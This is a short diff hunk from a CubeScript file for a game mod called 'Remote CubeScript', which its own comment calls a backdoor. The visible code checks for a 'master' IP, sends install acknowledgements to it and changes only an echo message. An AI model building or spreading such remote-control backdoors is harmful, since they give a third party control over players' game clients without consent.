@@ -88,7 +88,7 @@ rcs_uninstall = [ && 0 [
 
 //Congrats, you just got yourself a backdoor!
 if (=s masterip $connectedip) [
-  echo "^f1Remote CubeScript^f7 installed! Sending acknowledgement to mastername..."
+  echo "^f1Remote CubeScript^f7 installed! Sending acknowledgement to ^f2masterdesc^f7..."
   servcmd rcshello 0
   servcmd rcsinstalled
 ] [
